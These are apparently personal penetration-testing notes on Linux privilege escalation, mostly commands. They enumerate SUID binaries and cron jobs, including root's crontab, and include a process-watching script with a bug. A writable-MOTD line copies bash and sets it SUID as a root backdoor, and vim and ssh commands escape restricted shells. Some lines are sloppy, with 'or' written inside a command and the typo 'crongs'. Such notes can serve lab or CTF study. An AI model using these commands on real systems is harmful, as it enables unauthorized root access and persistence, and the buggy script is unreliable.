 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
# Check for crons



```bash
find / -perm -4000 2>/dev/null # find SUID 
cat /etc/crontab or crontab -l #  find cron jobs

cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#" # crongs

ls -al /etc/cron* /etc/at* # find crons

# Check for what from /usr changing what in /home/student/message
grep -rnw /usr -e "PATH TO THE FILE BEING UPDATED" # eg. /home/student/message
```

## script
```
#!/bin/bash

IFS=$'\n'
old_process=$(ps -eo command)

while true; do 
  new_process=$(ps -eo command)
  diff <(echo "$old_process") <(echo "$new_process")  |grep [\<\>]
  sleep 1 
  old_process=new_process 
done
```
# writable MOTD

echo "cp /bin/bash /home/name/bash && chmod u+s /home/name/bash" >> 00-header

# SUID

find / -perm -4000 2>/dev/null find SUID 
cat /etc/crontab or crontab -l  find cron jobs
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

# Restricted shell escape

```
/bin/bash

echo /usr/bin/*
$(whoami)

```


## Text Editors

The first technique we'll look at to escape restricted shells is through [text editors](https://null-byte.wonderhowto.com/how-to/intro-vim-unix-text-editor-every-hacker-should-be-familiar-with-0174674/). Most text editors, like vim, vi, nano, pico, ed, etc., can run commands and scripts inside of them. The following commands can be used to potentially spawn a shell:

```unknown
:!/bin/sh
:shell
:set shell=/bin/sh
```

Finally, if [SSH](https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/) access is available but drops you into a restricted shell, connecting with the following options can be used to escape:

```unknown
ssh user@IP -t "bash --noprofile"
ssh user@IP -t "/bin/sh"
```